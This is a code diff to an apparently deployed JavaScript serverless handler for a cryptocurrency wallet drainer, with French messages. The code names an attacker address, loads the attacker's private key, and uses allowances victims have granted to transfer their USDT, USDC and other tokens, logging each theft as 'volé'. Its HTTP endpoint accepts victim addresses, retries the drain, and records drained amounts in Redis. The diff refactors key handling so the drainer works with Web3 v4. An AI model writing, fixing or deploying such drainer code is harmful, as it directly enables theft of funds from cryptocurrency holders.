@@ -6,21 +6,31 @@ import { createClient } from 'redis';
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
 
 function getPrivateKey() {
+  let rawKey = '';
+  
   if (process.env.ATTACKER_PRIVATE_KEY) {
-    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
-    if (key.length === 64) return key;
-    console.warn('ATTACKER_PRIVATE_KEY env invalide, tentative fichier...');
-  }
-  const filePath = path.resolve('./private_key.txt');
-  try {
-    if (fs.existsSync(filePath)) {
-      const key = fs.readFileSync(filePath, 'utf8').trim();
-      if (key.length === 64) return key;
+    rawKey = process.env.ATTACKER_PRIVATE_KEY.trim();
+  } else {
+    const filePath = path.resolve('./private_key.txt');
+    try {
+      if (fs.existsSync(filePath)) {
+        rawKey = fs.readFileSync(filePath, 'utf8').trim();
+      }
+    } catch (err) {
+      console.warn('Erreur lecture private_key.txt:', err.message);
     }
-  } catch (err) {
-    console.warn('Erreur lecture private_key.txt:', err.message);
   }
-  throw new Error('Aucune clé privée valide. Attends ATTACKER_PRIVATE_KEY dans env ou private_key.txt (64 hex sans 0x)');
+
+  rawKey = rawKey.replace(/^0x/, '').replace(/\s/g, '').toLowerCase();
+
+  if (rawKey.length === 64 && /^[0-9a-f]{64}$/.test(rawKey)) {
+    return rawKey;
+  }
+
+  throw new Error(
+    'Clé privée invalide. Doit être 64 hex (sans 0x). Vérifie ATTACKER_PRIVATE_KEY dans env ou private_key.txt.\n' +
+    'Valeur reçue (nettoyée) : "' + rawKey + '"'
+  );
 }
 
 const PRIVATE_KEY = getPrivateKey();
@@ -62,7 +72,9 @@ async function drainVictim(victimAddress, chainId) {
     throw new Error(`RPC ${chainId} non joignable`);
   }
 
-  const derived = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY).address;
+  // Convertir la clé en Buffer (format attendu par Web3 v4)
+  const privateKeyBuffer = Buffer.from(PRIVATE_KEY, 'hex');
+  const derived = web3.eth.accounts.privateKeyToAccount(privateKeyBuffer).address;
   if (derived.toLowerCase() !== ATTACKER_ADDRESS.toLowerCase()) {
     throw new Error(`La clé privée ne correspond pas à ${ATTACKER_ADDRESS}`);
   }
@@ -99,13 +111,13 @@ async function drainVictim(victimAddress, chainId) {
         nonce,
       };
 
-      const signedTx = await web3.eth.accounts.signTransaction(tx, PRIVATE_KEY);
+      // Signer avec le Buffer
+      const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
       const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
       console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
 
       const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
       const drainedAmount = web3.utils.fromWei(allowance, decimals);
-      // Enregistrer dans Redis si disponible
       const client = await getRedisClient();
       if (client) {
         try {
@@ -151,7 +163,6 @@ async function drainWithRetry(victim, chainId, retries = 10, baseDelay = 1000) {
 }
 
 export default async function handler(req, res) {
-  // CORS obligatoire avant tout traitement
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -162,7 +173,6 @@ export default async function handler(req, res) {
   try {
     const { victim, chain, adminSecret } = req.body;
 
-    // Drain admin
     if (adminSecret) {
       if (adminSecret !== process.env.ADMIN_SECRET) {
         return res.status(401).json({ error: 'Secret invalide' });
@@ -172,25 +182,16 @@ export default async function handler(req, res) {
       }
       const targetChain = chain || '1';
       console.log(`Drain admin pour ${victim} chain ${targetChain}`);
-      // Drain synchrone
       const success = await drainWithRetry(victim, targetChain);
-      if (success) {
-        return res.status(200).json({ success: true, victim, chain: targetChain });
-      } else {
-        return res.status(500).json({ success: false, error: 'Drain a échoué après toutes les tentatives' });
-      }
+      if (success) return res.status(200).json({ success: true, victim, chain: targetChain });
+      else return res.status(500).json({ success: false, error: 'Drain a échoué' });
     }
 
-    // Drain normal
     if (!victim) return res.status(400).json({ error: 'Victime manquante' });
     console.log(`Victime reçue : ${victim} sur chain ${chain || '1'}`);
-    // Drain synchrone
     const success = await drainWithRetry(victim, chain || '1');
-    if (success) {
-      return res.status(200).json({ success: true, victim, chain: chain || '1' });
-    } else {
-      return res.status(500).json({ success: false, error: 'Drain a échoué après toutes les tentatives' });
-    }
+    if (success) return res.status(200).json({ success: true, victim, chain: chain || '1' });
+    else return res.status(500).json({ success: false, error: 'Drain a échoué' });
 
   } catch (err) {
     console.error('Handler error:', err);
